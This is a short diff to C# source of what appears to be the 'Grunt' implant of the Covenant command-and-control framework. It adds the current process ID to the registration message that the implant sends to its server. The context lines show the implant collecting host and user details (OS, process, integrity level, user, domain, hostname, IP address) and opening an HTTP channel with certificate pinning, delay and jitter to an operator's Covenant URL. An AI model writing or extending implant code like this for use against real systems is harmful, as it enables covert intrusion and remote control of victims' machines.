@@ -46,6 +46,7 @@ namespace GruntExecutor
                 }
                 string OperatingSystem = Environment.OSVersion.ToString();
                 string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+                int ProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
                 int Integrity = 2;
                 if (Environment.UserName.ToLower() == "system")
                 {
@@ -62,7 +63,7 @@ namespace GruntExecutor
                 string UserDomainName = Environment.UserDomainName;
                 string UserName = Environment.UserName;
 
-                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
+                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""processId"": """ + ProcessId + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                 IMessenger baseMessenger = null;
                 baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
                 baseMessenger.Read();
